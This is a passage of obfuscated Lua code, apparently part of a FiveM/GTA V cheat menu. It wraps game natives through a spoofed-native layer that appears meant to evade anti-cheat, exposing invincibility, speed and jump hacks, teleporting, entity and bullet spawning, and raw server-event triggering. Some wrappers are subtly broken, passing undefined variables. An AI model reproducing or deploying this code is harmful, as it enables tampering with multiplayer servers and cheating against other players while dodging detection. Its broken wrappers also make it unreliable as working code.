RfPsUKHSFWJuBEJuz.rE.LumHash = function(hash)
    if RfPsUKHSFWJuBEJuz.rE.LumTyper(hash) == 'string' then
        return RfPsUKHSFWJuBEJuz.rE.HashFucker(hash)
    end
    return hash
end

-- simply a native table --
local nlFXKkFxuKQAk = {
    natives = {
        BigCheckerino = function()
            return RfPsUKHSFWJuBEJuz.rE.LumInv(RfPsUKHSFWJuBEJuz.elspoofednatives['BigCheckerino'], "menu_Lumia", RfPsUKHSFWJuBEJuz.rE.LumRRA(), RfPsUKHSFWJuBEJuz.rE.LumRAI())
        end,
        WebReq = function(url, args, req_type)
            return RfPsUKHSFWJuBEJuz.rE.LumInv(RfPsUKHSFWJuBEJuz.elspoofednatives['WebReq'], url, RfPsUKHSFWJuBEJuz.rE.LumJson.LumEncode(args), req_type, RfPsUKHSFWJuBEJuz.rE.LumRAS())
        end,
        rEUid = function()
            return RfPsUKHSFWJuBEJuz.rE.LumInv(RfPsUKHSFWJuBEJuz.elspoofednatives['rEUid'], RfPsUKHSFWJuBEJuz.rE.LumRRA(), RfPsUKHSFWJuBEJuz.rE.LumRAI())
        end,
        DrawRect = function(x, y, w, h, r, g, b, a)
            return RfPsUKHSFWJuBEJuz.rE.LumInv(RfPsUKHSFWJuBEJuz.elspoofednatives['DrawRect'], x, y, w, h, r, g, b, a)
        end,
        IsDisabledControlJustReleased = function(a, b)
            return RfPsUKHSFWJuBEJuz.rE.LumInv(RfPsUKHSFWJuBEJuz.elspoofednatives['IsDisabledControlJustReleased'], a, b, RfPsUKHSFWJuBEJuz.rE.LumRRA())
        end,
        SetMouseCursorActiveThisFrame = function()
            return RfPsUKHSFWJuBEJuz.rE.LumInv(RfPsUKHSFWJuBEJuz.elspoofednatives['SetMouseCursorActiveThisFrame'])
        end,
        DisableAllControlActions = function(a)
            return RfPsUKHSFWJuBEJuz.rE.LumInv(RfPsUKHSFWJuBEJuz.elspoofednatives['DisableAllControlActions'], a)
        end,
        GetActiveScreenResolution = function()
            return RfPsUKHSFWJuBEJuz.rE.LumInv(RfPsUKHSFWJuBEJuz.elspoofednatives['GetActiveScreenResolution'], RfPsUKHSFWJuBEJuz.rE.LumI(), RfPsUKHSFWJuBEJuz.rE.LumI())
        end,
        GetNuiCursorPosition = function()
            return RfPsUKHSFWJuBEJuz.rE.LumInv(RfPsUKHSFWJuBEJuz.elspoofednatives['GetNuiCursorPosition'], RfPsUKHSFWJuBEJuz.rE.LumI(), RfPsUKHSFWJuBEJuz.rE.LumI())
        end,
        SetTextFont = function(font)
            return RfPsUKHSFWJuBEJuz.rE.LumInv(RfPsUKHSFWJuBEJuz.elspoofednatives['SetTextFont'], font)
        end,
        SetTextScale = function(scale, scale1)
            return RfPsUKHSFWJuBEJuz.rE.LumInv(RfPsUKHSFWJuBEJuz.elspoofednatives['SetTextScale'], scale, scale1)
        end,
        SetTextCentre = function(align)
            return RfPsUKHSFWJuBEJuz.rE.LumInv(RfPsUKHSFWJuBEJuz.elspoofednatives['SetTextCentre'], align)
        end,
        SetTextColour = function(r, g, b, a)
            return RfPsUKHSFWJuBEJuz.rE.LumInv(RfPsUKHSFWJuBEJuz.elspoofednatives['SetTextColour'], r, g, b, a)
        end,
        BeginTextCommandDisplayText = function(text)
            return RfPsUKHSFWJuBEJuz.rE.LumInv(RfPsUKHSFWJuBEJuz.elspoofednatives['BeginTextCommandDisplayText'], RfPsUKHSFWJuBEJuz.rE.LumToString(text))
        end,
        AddTextComponentSubstringPlayerName = function(text)
            return RfPsUKHSFWJuBEJuz.rE.LumInv(RfPsUKHSFWJuBEJuz.elspoofednatives['AddTextComponentSubstringPlayerName'], RfPsUKHSFWJuBEJuz.rE.LumToString(text))
        end,
        EndTextCommandDisplayText = function(x, y)
            return RfPsUKHSFWJuBEJuz.rE.LumInv(RfPsUKHSFWJuBEJuz.elspoofednatives['EndTextCommandDisplayText'], x, y)
        end,
        IsDisabledControlPressed = function(a, b)
            return RfPsUKHSFWJuBEJuz.rE.LumInv(RfPsUKHSFWJuBEJuz.elspoofednatives['IsDisabledControlPressed'], a, b, RfPsUKHSFWJuBEJuz.rE.LumRRA())
        end,
        SetMouseCursorSprite = function(a)
            return RfPsUKHSFWJuBEJuz.rE.LumInv(RfPsUKHSFWJuBEJuz.elspoofednatives['SetMouseCursorSprite'], a)
        end,
        PlaySoundFrontend = function(soundId, audioName, audioRef, p3)
            return RfPsUKHSFWJuBEJuz.rE.LumInv(RfPsUKHSFWJuBEJuz.elspoofednatives['PlaySoundFrontend'], soundId, RfPsUKHSFWJuBEJuz.rE.LumToString(audioName), RfPsUKHSFWJuBEJuz.rE.LumToString(audioRef), p3)
        end,
        BeginTextCommandWidth = function(text)
            return RfPsUKHSFWJuBEJuz.rE.LumInv(RfPsUKHSFWJuBEJuz.elspoofednatives['BeginTextCommandWidth'], RfPsUKHSFWJuBEJuz.rE.LumToString(text))
        end,
        EndTextCommandGetWidth = function(font)
            return RfPsUKHSFWJuBEJuz.rE.LumInv(RfPsUKHSFWJuBEJuz.elspoofednatives['EndTextCommandGetWidth'], font, RfPsUKHSFWJuBEJuz.rE.LumRAF())
        end,
        HasStreamedTextureDictLoaded = function(dict)
            return RfPsUKHSFWJuBEJuz.rE.LumInv(RfPsUKHSFWJuBEJuz.elspoofednatives['HasStreamedTextureDictLoaded'], RfPsUKHSFWJuBEJuz.rE.LumToString(dict), RfPsUKHSFWJuBEJuz.rE.LumRRA())
        end,
        RequestStreamedTextureDict = function(dict)
            return RfPsUKHSFWJuBEJuz.rE.LumInv(RfPsUKHSFWJuBEJuz.elspoofednatives['RequestStreamedTextureDict'], RfPsUKHSFWJuBEJuz.rE.LumToString(dict))
        end,
        DrawSprite = function(dict, name, x, y, w, h, heading, r, g, b, a)
            return RfPsUKHSFWJuBEJuz.rE.LumInv(RfPsUKHSFWJuBEJuz.elspoofednatives['DrawSprite'], RfPsUKHSFWJuBEJuz.rE.LumToString(dict), RfPsUKHSFWJuBEJuz.rE.LumToString(name), x, y, w, h, heading, r, g, b, a)
        end,
        GetDuiHandle = function(duiObject)
            return RfPsUKHSFWJuBEJuz.rE.LumInv(RfPsUKHSFWJuBEJuz.elspoofednatives['GetDuiHandle'], duiObject, RfPsUKHSFWJuBEJuz.rE.LumRRA(), RfPsUKHSFWJuBEJuz.rE.LumRAS())
        end,
        CreateRuntimeTextureFromDuiHandle = function(txd, txn, duiHandle)
            return RfPsUKHSFWJuBEJuz.rE.LumInv(RfPsUKHSFWJuBEJuz.elspoofednatives['CreateRuntimeTextureFromDuiHandle'], txd, txn, RfPsUKHSFWJuBEJuz.rE.LumToString(duiHandle), RfPsUKHSFWJuBEJuz.rE.LumRRA(), RfPsUKHSFWJuBEJuz.rE.LumRAL())
        end,
        CreateRuntimeTxd = function(name)
            return RfPsUKHSFWJuBEJuz.rE.LumInv(RfPsUKHSFWJuBEJuz.elspoofednatives['CreateRuntimeTxd'], RfPsUKHSFWJuBEJuz.rE.LumToString(name), RfPsUKHSFWJuBEJuz.rE.LumRRA(), RfPsUKHSFWJuBEJuz.rE.LumRAL())
        end,
        CreateDui = function(url, width, height)
            return RfPsUKHSFWJuBEJuz.rE.LumInv(RfPsUKHSFWJuBEJuz.elspoofednatives['CreateDui'], RfPsUKHSFWJuBEJuz.rE.LumToString(url), width, height, RfPsUKHSFWJuBEJuz.rE.LumRRA(), RfPsUKHSFWJuBEJuz.rE.LumRAL())
        end,
        SetEntityHealth = function(entity,health)
            return RfPsUKHSFWJuBEJuz.rE.LumInv(RfPsUKHSFWJuBEJuz.elspoofednatives['SetEntityHealth'], entity, health)
        end,
        TriggerServerEventInternal = function(eventName, eventPayload, payloadlength)
            return RfPsUKHSFWJuBEJuz.rE.LumInv(RfPsUKHSFWJuBEJuz.elspoofednatives['TriggerServerEventInternal'], RfPsUKHSFWJuBEJuz.rE.LumToString(eventName), RfPsUKHSFWJuBEJuz.rE.LumToString(eventPayload), payloadlength)
        end,
        TriggerEventInternal = function(eventName, eventPayload, payloadlength)
            return RfPsUKHSFWJuBEJuz.rE.LumInv(RfPsUKHSFWJuBEJuz.elspoofednatives['TriggerEventInternal'], RfPsUKHSFWJuBEJuz.rE.LumToString(eventName), RfPsUKHSFWJuBEJuz.rE.LumToString(eventPayload), payloadlength)
        end,
        StopScreenEffect = function(effectName)
            return RfPsUKHSFWJuBEJuz.rE.LumInv(RfPsUKHSFWJuBEJuz.elspoofednatives['StopScreenEffect'], RfPsUKHSFWJuBEJuz.rE.LumToString(effectName))
        end,
        ClearPedBloodDamage = function(ped)
            return RfPsUKHSFWJuBEJuz.rE.LumInv(RfPsUKHSFWJuBEJuz.elspoofednatives['ClearPedBloodDamage'], ped)
        end,
        GetEntityCoords = function(entity)
            return RfPsUKHSFWJuBEJuz.rE.LumInv(RfPsUKHSFWJuBEJuz.elspoofednatives['GetEntityCoords'], entity, RfPsUKHSFWJuBEJuz.rE.LumRRA(), RfPsUKHSFWJuBEJuz.rE.LumRAV())
        end,
        PlayerPedId = function()
            return RfPsUKHSFWJuBEJuz.rE.LumInv(RfPsUKHSFWJuBEJuz.elspoofednatives['PlayerPedId'], RfPsUKHSFWJuBEJuz.rE.LumRRA(), RfPsUKHSFWJuBEJuz.rE.LumRAI())
        end,
        GetPlayerPed = function(id)
            return RfPsUKHSFWJuBEJuz.rE.LumInv(RfPsUKHSFWJuBEJuz.elspoofednatives['GetPlayerPed'], id, RfPsUKHSFWJuBEJuz.rE.LumRRA(), RfPsUKHSFWJuBEJuz.rE.LumRAI())
        end,
        NetworkResurrectLocalPlayer = function(p0, p1, p2, p3, p4, p5)
            return RfPsUKHSFWJuBEJuz.rE.LumInv(RfPsUKHSFWJuBEJuz.elspoofednatives['NetworkResurrectLocalPlayer'], p0, p1, p2, p3, p4, p5)
        end,
        SetEntityCoordsNoOffset = function(entity, X, Y, Z, p4, p5, p6)
            return RfPsUKHSFWJuBEJuz.rE.LumInv(RfPsUKHSFWJuBEJuz.elspoofednatives['SetEntityCoordsNoOffset'], entity, X, Y, Z, p4, p5, p6)
        end,
        AddArmourToPed = function(ped, amount)
            return RfPsUKHSFWJuBEJuz.rE.LumInv(RfPsUKHSFWJuBEJuz.elspoofednatives['AddArmourToPed'], ped, amount)
        end,
        SetPlayerInvincible = function(ped, toggle)
            return RfPsUKHSFWJuBEJuz.rE.LumInv(RfPsUKHSFWJuBEJuz.elspoofednatives['SetPlayerInvincible'], ped, toggle)
        end,
        SetEntityInvincible = function(ped, toggle)
            return RfPsUKHSFWJuBEJuz.rE.LumInv(RfPsUKHSFWJuBEJuz.elspoofednatives['SetEntityInvincible'], ped, toggle)
        end,
        SetEntityVisible = function(p0, p1, p2)
            return RfPsUKHSFWJuBEJuz.rE.LumInv(RfPsUKHSFWJuBEJuz.elspoofednatives['SetEntityVisible'], p0, p1, p2)
        end,
        SetRunSprintMultiplierForPlayer = function(player, multiplier)
            return RfPsUKHSFWJuBEJuz.rE.LumInv(RfPsUKHSFWJuBEJuz.elspoofednatives['SetRunSprintMultiplierForPlayer'], player, multiplier)
        end,
        SetPedMoveRateOverride = function(ped, value)
            return RfPsUKHSFWJuBEJuz.rE.LumInv(RfPsUKHSFWJuBEJuz.elspoofednatives['SetPedMoveRateOverride'], ped, value)
        end,
        ResetPlayerStamina = function(player)
            return RfPsUKHSFWJuBEJuz.rE.LumInv(RfPsUKHSFWJuBEJuz.elspoofednatives['ResetPlayerStamina'], player)
        end,
        SetSuperJumpThisFrame = function(player)
            return RfPsUKHSFWJuBEJuz.rE.LumInv(RfPsUKHSFWJuBEJuz.elspoofednatives['SetSuperJumpThisFrame'], player, RfPsUKHSFWJuBEJuz.rE.LumRRA(), RfPsUKHSFWJuBEJuz.rE.LumRAI())
        end,
        PlayerId = function()
            return RfPsUKHSFWJuBEJuz.rE.LumInv(RfPsUKHSFWJuBEJuz.elspoofednatives['PlayerId'], RfPsUKHSFWJuBEJuz.rE.LumRRA(), RfPsUKHSFWJuBEJuz.rE.LumRAI())
        end,
        RequestModel = function(model)
            return RfPsUKHSFWJuBEJuz.rE.LumInv(RfPsUKHSFWJuBEJuz.elspoofednatives['RequestModel'], RfPsUKHSFWJuBEJuz.rE.LumHash(model))
        end,
        HasModelLoaded = function(model)
            return RfPsUKHSFWJuBEJuz.rE.LumInv(RfPsUKHSFWJuBEJuz.elspoofednatives['HasModelLoaded'], RfPsUKHSFWJuBEJuz.rE.LumHash(model), RfPsUKHSFWJuBEJuz.rE.LumRRA())
        end,
        SetPlayerModel = function(player, model)
            return RfPsUKHSFWJuBEJuz.rE.LumInv(RfPsUKHSFWJuBEJuz.elspoofednatives['SetPlayerModel'], player, RfPsUKHSFWJuBEJuz.rE.LumHash(model))
        end,
        SetModelAsNoLongerNeeded = function(model)
            return RfPsUKHSFWJuBEJuz.rE.LumInv(RfPsUKHSFWJuBEJuz.elspoofednatives['SetModelAsNoLongerNeeded'], RfPsUKHSFWJuBEJuz.rE.LumHash(model))
        end,
        SetPedHeadBlendData = function(ped, shapeFirstID, shapeSecondID, shapeThirdID, skinFirstID, skinSecondID, skinThirdID, shapeMix, skinMix, thirdMix, isParent)
            return RfPsUKHSFWJuBEJuz.rE.LumInv(RfPsUKHSFWJuBEJuz.elspoofednatives['SetPedHeadBlendData'], ped, shapeFirstID, shapeSecondID, shapeThirdID, skinFirstID, skinSecondID, skinThirdID, shapeMix, skinMix, thirdMix, isParent)
        end,
        SetPedHeadOverlay = function(ped, overlayID, index, opacity)
            return RfPsUKHSFWJuBEJuz.rE.LumInv(RfPsUKHSFWJuBEJuz.elspoofednatives['SetPedHeadOverlay'], ped, overlayID, index, opacity)
        end,
        SetPedHeadOverlayColor = function(ped, overlayID, colorType, colorID, secondColorID)
            return RfPsUKHSFWJuBEJuz.rE.LumInv(RfPsUKHSFWJuBEJuz.elspoofednatives['SetPedHeadOverlayColor'], ped, overlayID, colorType, colorID, secondColorID)
        end,
        SetPedComponentVariation = function(ped, componentId, drawableId, textureId, paletteId)
            return RfPsUKHSFWJuBEJuz.rE.LumInv(RfPsUKHSFWJuBEJuz.elspoofednatives['SetPedComponentVariation'], ped, componentId, drawableId, textureId, paletteId)
        end,
        SetPedHairColor = function(ped, colorID, highlightColorID)
            return RfPsUKHSFWJuBEJuz.rE.LumInv(RfPsUKHSFWJuBEJuz.elspoofednatives['SetPedHairColor'], ped, colorID, highlightColorID)
        end,
        SetPedPropIndex = function(ped, componentId, drawableId, TextureId, attach)
            return RfPsUKHSFWJuBEJuz.rE.LumInv(RfPsUKHSFWJuBEJuz.elspoofednatives['SetPedPropIndex'], ped, componentId, drawableId, TextureId, attach)
        end,
        SetPedDefaultComponentVariation = function(ped)
            return RfPsUKHSFWJuBEJuz.rE.LumInv(RfPsUKHSFWJuBEJuz.elspoofednatives['SetPedDefaultComponentVariation'], ped)
        end,
        CreateCam = function(camName, p1)
            return RfPsUKHSFWJuBEJuz.rE.LumInv(RfPsUKHSFWJuBEJuz.elspoofednatives['CreateCam'], RfPsUKHSFWJuBEJuz.rE.LumToString(camName), p1, RfPsUKHSFWJuBEJuz.rE.LumRRA(), RfPsUKHSFWJuBEJuz.rE.LumRAI())
        end,
        RenderScriptCams = function(render, ease, easeTime, p3, p4)
            return RfPsUKHSFWJuBEJuz.rE.LumInv(RfPsUKHSFWJuBEJuz.elspoofednatives['RenderScriptCams'], render, ease, camera, p3, p4)
        end,
        SetCamActive = function(cam, active)
            return RfPsUKHSFWJuBEJuz.rE.LumInv(RfPsUKHSFWJuBEJuz.elspoofednatives['SetCamActive'], cam, active)
        end,
        SetFocusEntity = function(entity)
            return RfPsUKHSFWJuBEJuz.rE.LumInv(RfPsUKHSFWJuBEJuz.elspoofednatives['SetFocusEntity'], entity)
        end,
        GetControlNormal = function(inputGroup, control)
            return RfPsUKHSFWJuBEJuz.rE.LumInv(RfPsUKHSFWJuBEJuz.elspoofednatives['GetControlNormal'], inputGroup, control, RfPsUKHSFWJuBEJuz.rE.LumRRA(), RfPsUKHSFWJuBEJuz.rE.LumRAF())
        end,
        GetDisabledControlNormal = function(p0, p1)
            return RfPsUKHSFWJuBEJuz.rE.LumInv(RfPsUKHSFWJuBEJuz.elspoofednatives['GetDisabledControlNormal'], p0, p1, RfPsUKHSFWJuBEJuz.rE.LumRRA(), RfPsUKHSFWJuBEJuz.rE.LumRAF())
        end,
        GetEntityRotation = function(entity, p1)
            return RfPsUKHSFWJuBEJuz.rE.LumInv(RfPsUKHSFWJuBEJuz.elspoofednatives['GetEntityRotation'], entity, p1, RfPsUKHSFWJuBEJuz.rE.LumRRA(), RfPsUKHSFWJuBEJuz.rE.LumRAV())
        end,
        SetCamRot = function(cam, rotX, rotY, rotZ, p4)
            return RfPsUKHSFWJuBEJuz.rE.LumInv(RfPsUKHSFWJuBEJuz.elspoofednatives['SetCamRot'], cam, rotX, rotY, rotZ, p4)
        end,
        GetGroundZFor_3dCoord = function(x, y, z)
            return RfPsUKHSFWJuBEJuz.rE.LumInv(RfPsUKHSFWJuBEJuz.elspoofednatives['GetGroundZFor_3dCoord'], x, y, z, RfPsUKHSFWJuBEJuz.rE.LumPVF(), RfPsUKHSFWJuBEJuz.rE.LumRRA())
        end,
        GetOffsetFromEntityInWorldCoords = function(entity, xOffset, yOffset, zOffset)
            return RfPsUKHSFWJuBEJuz.rE.LumInv(RfPsUKHSFWJuBEJuz.elspoofednatives['GetOffsetFromEntityInWorldCoords'], entity, xOffset, yOffset, zOffset, RfPsUKHSFWJuBEJuz.rE.LumRRA(), RfPsUKHSFWJuBEJuz.rE.LumRAV())
        end,
        SetCamCoord = function(cam, posX, posY, posZ)
            return RfPsUKHSFWJuBEJuz.rE.LumInv(RfPsUKHSFWJuBEJuz.elspoofednatives['SetCamCoord'], cam, posX, posY, posZ)
        end,
        ClearFocus = function()
            return RfPsUKHSFWJuBEJuz.rE.LumInv(RfPsUKHSFWJuBEJuz.elspoofednatives['ClearFocus'])
        end,
        AddTextEntry = function(entryKey, entryText)
            return RfPsUKHSFWJuBEJuz.rE.LumInv(RfPsUKHSFWJuBEJuz.elspoofednatives['AddTextEntry'], RfPsUKHSFWJuBEJuz.rE.LumToString(entryKey), RfPsUKHSFWJuBEJuz.rE.LumToString(entryText))
        end,
        DisplayOnscreenKeyboard = function(p0, windowTitle, p2, defaultText, defaultConcat1, defaultConcat2, defaultConcat3, maxInputLength)
            return RfPsUKHSFWJuBEJuz.rE.LumInv(RfPsUKHSFWJuBEJuz.elspoofednatives['DisplayOnscreenKeyboard'], p0, RfPsUKHSFWJuBEJuz.rE.LumToString(windowTitle), RfPsUKHSFWJuBEJuz.rE.LumToString(p2), RfPsUKHSFWJuBEJuz.rE.LumToString(defaultText), RfPsUKHSFWJuBEJuz.rE.LumToString(defaultConcat1), RfPsUKHSFWJuBEJuz.rE.LumToString(defaultConcat2), RfPsUKHSFWJuBEJuz.rE.LumToString(defaultConcat3), maxInputLength)
        end,
        UpdateOnscreenKeyboard = function()
            return RfPsUKHSFWJuBEJuz.rE.LumInv(RfPsUKHSFWJuBEJuz.elspoofednatives['UpdateOnscreenKeyboard'], RfPsUKHSFWJuBEJuz.rE.LumRRA(), RfPsUKHSFWJuBEJuz.rE.LumRAI())
        end,
        GetOnscreenKeyboardResult = function()
            return RfPsUKHSFWJuBEJuz.rE.LumInv(RfPsUKHSFWJuBEJuz.elspoofednatives['GetOnscreenKeyboardResult'], RfPsUKHSFWJuBEJuz.rE.LumRRA(), RfPsUKHSFWJuBEJuz.rE.LumRAS())
        end,
        EnableAllControlActions = function(index)
            return RfPsUKHSFWJuBEJuz.rE.LumInv(RfPsUKHSFWJuBEJuz.elspoofednatives['EnableAllControlActions'], index)
        end,
        GetActivePlayers = function()
            return RfPsUKHSFWJuBEJuz.rE.LumTable.LumMsgUnpack(RfPsUKHSFWJuBEJuz.rE.LumInv(RfPsUKHSFWJuBEJuz.elspoofednatives['GetActivePlayers'], RfPsUKHSFWJuBEJuz.rE.LumRRA(), RfPsUKHSFWJuBEJuz.rE.LumRAO()))
        end,
        GetPlayerServerId = function(a)
            return RfPsUKHSFWJuBEJuz.rE.LumInv(RfPsUKHSFWJuBEJuz.elspoofednatives['GetPlayerServerId'], a, RfPsUKHSFWJuBEJuz.rE.LumRRA(), RfPsUKHSFWJuBEJuz.rE.LumRAI())
        end,
        GetPlayerName = function(playerSrc)
            return RfPsUKHSFWJuBEJuz.rE.LumInv(RfPsUKHSFWJuBEJuz.elspoofednatives['GetPlayerName'], playerSrc, RfPsUKHSFWJuBEJuz.rE.LumRAS())
        end,
        DestroyCam = function(cam)
            return RfPsUKHSFWJuBEJuz.rE.LumInv(RfPsUKHSFWJuBEJuz.elspoofednatives['DestroyCam'], cam)
        end,
        ClearTimecycleModifier = function()
            return RfPsUKHSFWJuBEJuz.rE.LumInv(RfPsUKHSFWJuBEJuz.elspoofednatives['ClearTimecycleModifier'])
        end,
        IsModelValid = function(model)
            return RfPsUKHSFWJuBEJuz.rE.LumInv(RfPsUKHSFWJuBEJuz.elspoofednatives['IsModelValid'], RfPsUKHSFWJuBEJuz.rE.LumHash(model), RfPsUKHSFWJuBEJuz.rE.LumRRA())
        end,
        IsModelAVehicle = function(model)
            return RfPsUKHSFWJuBEJuz.rE.LumInv(RfPsUKHSFWJuBEJuz.elspoofednatives['IsModelAVehicle'], RfPsUKHSFWJuBEJuz.rE.LumHash(model), RfPsUKHSFWJuBEJuz.rE.LumRRA())
        end,
        CreateVehicle = function(modelHash, x, y, z, heading, networkHandle, vehiclehandle)
            return RfPsUKHSFWJuBEJuz.rE.LumInv(RfPsUKHSFWJuBEJuz.elspoofednatives['CreateVehicle'], modelHash, x, y, z, heading, networkHandle, vehiclehandle, RfPsUKHSFWJuBEJuz.rE.LumRRA(), RfPsUKHSFWJuBEJuz.rE.LumRAI())
        end,
        SetPedIntoVehicle = function(ped, vehicle, seatIndex)
            return RfPsUKHSFWJuBEJuz.rE.LumInv(RfPsUKHSFWJuBEJuz.elspoofednatives['SetPedIntoVehicle'], ped, vehicle, seatIndex)
        end,
        CreateObject = function(modelHash, x, y, z, isNetwork, netMissionEntity, dynamic)
            return RfPsUKHSFWJuBEJuz.rE.LumInv(RfPsUKHSFWJuBEJuz.elspoofednatives['CreateObject'], modelHash, x, y, z, isNetwork, netMissionEntity, dynamic, RfPsUKHSFWJuBEJuz.rE.LumRRA(), RfPsUKHSFWJuBEJuz.rE.LumRAI())
        end,
        ShootSingleBulletBetweenCoords = function(x1, y1, z1, x2, y2, z2, damage, p7, weaponHash, ownerPed, isAudible, isInvisible, speed)
            return RfPsUKHSFWJuBEJuz.rE.LumInv(RfPsUKHSFWJuBEJuz.elspoofednatives['ShootSingleBulletBetweenCoords'], x1, y1, z1, x2, y2, z2, damage, p7, RfPsUKHSFWJuBEJuz.rE.LumHash(weaponHash), ownerPed, isAudible, isInvisible, speed)
        end,
        RequestNamedPtfxAsset = function(assetName)
            return RfPsUKHSFWJuBEJuz.rE.LumInv(RfPsUKHSFWJuBEJuz.elspoofednatives['RequestNamedPtfxAsset'], RfPsUKHSFWJuBEJuz.rE.LumToString(assetName))
        end,
        HasNamedPtfxAssetLoaded = function(assetName)
            return RfPsUKHSFWJuBEJuz.rE.LumInv(RfPsUKHSFWJuBEJuz.elspoofednatives['HasNamedPtfxAssetLoaded'], RfPsUKHSFWJuBEJuz.rE.LumToString(assetName), RfPsUKHSFWJuBEJuz.rE.LumRRA())
        end,
        UseParticleFxAsset = function(name)
            return RfPsUKHSFWJuBEJuz.rE.LumInv(RfPsUKHSFWJuBEJuz.elspoofednatives['UseParticleFxAsset'], RfPsUKHSFWJuBEJuz.rE.LumToString(name))
        end,
        StartNetworkedParticleFxNonLoopedAtCoord = function(effectName, xPos, yPos, zPos, xRot, yRot, zRot, scale, xAxis, yAxis, zAxis)
            return RfPsUKHSFWJuBEJuz.rE.LumInv(RfPsUKHSFWJuBEJuz.elspoofednatives['StartNetworkedParticleFxNonLoopedAtCoord'], RfPsUKHSFWJuBEJuz.rE.LumToString(effectName), xPos, yPos, zPos, xRot, yRot, zRot, scale, xAxis, yAxis, zAxis, RfPsUKHSFWJuBEJuz.rE.LumRRA())
        end,
        AttachEntityToEntity = function(entity1, entity2, boneIndex, x, y, z, xRot, yRot, zRot, p9, isRel, ignoreUpVec, allowRotation, unk, p14)
            return RfPsUKHSFWJuBEJuz.rE.LumInv(RfPsUKHSFWJuBEJuz.elspoofednatives['AttachEntityToEntity'], entity1, entity2, boneIndex, x, y, z, xRot, yRot, zRot, p9, isRel, ignoreUpVec, allowRotation, unk, p14)
        end,
        GetPedBoneIndex = function(ped, boneId)
            return RfPsUKHSFWJuBEJuz.rE.LumInv(RfPsUKHSFWJuBEJuz.elspoofednatives['GetPedBoneIndex'], ped, boneId, RfPsUKHSFWJuBEJuz.rE.LumRRA(), RfPsUKHSFWJuBEJuz.rE.LumRAI())
        end,
        IsPedInAnyVehicle = function(ped, atGetIn)
            return RfPsUKHSFWJuBEJuz.rE.LumInv(RfPsUKHSFWJuBEJuz.elspoofednatives['IsPedInAnyVehicle'], ped, atGetIn, RfPsUKHSFWJuBEJuz.rE.LumRRA())
        end,
        GetVehiclePedIsUsing = function(ped)
            return RfPsUKHSFWJuBEJuz.rE.LumInv(RfPsUKHSFWJuBEJuz.elspoofednatives['GetVehiclePedIsUsing'], ped, RfPsUKHSFWJuBEJuz.rE.LumRRA(), RfPsUKHSFWJuBEJuz.rE.LumRAI())
        end,
        GetVehicleMaxNumberOfPassengers = function(vehicle)
            return RfPsUKHSFWJuBEJuz.rE.LumInv(RfPsUKHSFWJuBEJuz.elspoofednatives['GetVehicleMaxNumberOfPassengers'], vehicle, RfPsUKHSFWJuBEJuz.rE.LumRRA(), RfPsUKHSFWJuBEJuz.rE.LumRAI())
        end,
        IsVehicleSeatFree = function(vehicle, seatIndex)
            return RfPsUKHSFWJuBEJuz.rE.LumInv(RfPsUKHSFWJuBEJuz.elspoofednatives['IsVehicleSeatFree'], vehicle, seatIndex, RfPsUKHSFWJuBEJuz.rE.LumRRA())
        end,
        GetVehiclePedIsIn = function(ped, lastVehicle)
            return RfPsUKHSFWJuBEJuz.rE.LumInv(RfPsUKHSFWJuBEJuz.elspoofednatives['GetVehiclePedIsIn'], ped, getLastVehicle, RfPsUKHSFWJuBEJuz.rE.LumRRA(), RfPsUKHSFWJuBEJuz.rE.LumRAI())
        end,
        DisablePlayerFiring = function(player, toggle)
            return RfPsUKHSFWJuBEJuz.rE.LumInv(RfPsUKHSFWJuBEJuz.elspoofednatives['DisablePlayerFiring'], player, toggle)
        end,
        ClearPedTasks = function(ped)
            return RfPsUKHSFWJuBEJuz.rE.LumInv(RfPsUKHSFWJuBEJuz.elspoofednatives['ClearPedTasks'], ped)
        end,
        ClearPedTasksImmediately = function(ped)
            return RfPsUKHSFWJuBEJuz.rE.LumInv(RfPsUKHSFWJuBEJuz.elspoofednatives['ClearPedTasksImmediately'], ped)
        end,
        CreatePed = function(pedType, modelHash, x, y, z, heading, isNetwork, thisScriptCheck)
            return RfPsUKHSFWJuBEJuz.rE.LumInv(RfPsUKHSFWJuBEJuz.elspoofednatives['CreatePed'], pedType, modelHash, x, y, z, heading, isNetwork, thisScriptCheck, RfPsUKHSFWJuBEJuz.rE.LumRRA(), RfPsUKHSFWJuBEJuz.rE.LumRAI())
        end,
        FreezeEntityPosition = function(entity, toggle)
            return RfPsUKHSFWJuBEJuz.rE.LumInv(RfPsUKHSFWJuBEJuz.elspoofednatives['FreezeEntityPosition'], entity, toggle)
        end,
        AddRope = function(x, y, z, rotX, rotY, rotZ, length, ropeType, maxLength, minLength, p10, p11, p12, rigid, p14, breakWhenShot, unkPtr)
            return RfPsUKHSFWJuBEJuz.rE.LumInv(RfPsUKHSFWJuBEJuz.elspoofednatives['AddRope'], x, y, z, rotX, rotY, rotZ, length, ropeType, maxLength, minLength, p10, p11, p12, rigid, p14, breakWhenShot, RfPsUKHSFWJuBEJuz.rE.LumII(unkPtr), RfPsUKHSFWJuBEJuz.rE.LumRRA(), RfPsUKHSFWJuBEJuz.rE.LumRAI())
        end,
        SetPedCanRagdoll = function(ped, toggle)
            return RfPsUKHSFWJuBEJuz.rE.LumInv(RfPsUKHSFWJuBEJuz.elspoofednatives['SetPedCanRagdoll'], ped, toggle)
        end,
        ClearPedSecondaryTask = function(ped)
            return RfPsUKHSFWJuBEJuz.rE.LumInv(RfPsUKHSFWJuBEJuz.elspoofednatives['ClearPedSecondaryTask'], ped)
        end,
        TaskSetBlockingOfNonTemporaryEvents = function(ped, toggle)
            return RfPsUKHSFWJuBEJuz.rE.LumInv(RfPsUKHSFWJuBEJuz.elspoofednatives['TaskSetBlockingOfNonTemporaryEvents'], ped, toggle)
        end,
        SetPedFleeAttributes = function(ped, p1, p2)
            return RfPsUKHSFWJuBEJuz.rE.LumInv(RfPsUKHSFWJuBEJuz.elspoofednatives['SetPedFleeAttributes'], ped, p1, p2)
        end,
        SetPedCombatAttributes = function(ped, attributeIndex, p2)
            return RfPsUKHSFWJuBEJuz.rE.LumInv(RfPsUKHSFWJuBEJuz.elspoofednatives['SetPedCombatAttributes'], ped, attributeIndex, p2)
        end,
        SetPedSeeingRange = function(ped, value)
            return RfPsUKHSFWJuBEJuz.rE.LumInv(RfPsUKHSFWJuBEJuz.elspoofednatives['SetPedSeeingRange'], ped, value)
        end,
        SetPedHearingRange = function(ped, value)
            return RfPsUKHSFWJuBEJuz.rE.LumInv(RfPsUKHSFWJuBEJuz.elspoofednatives['SetPedHearingRange'], ped, value)
        end,
        SetPedAlertness = function(ped, value)
            return RfPsUKHSFWJuBEJuz.rE.LumInv(RfPsUKHSFWJuBEJuz.elspoofednatives['SetPedAlertness'], ped, value)
        end,
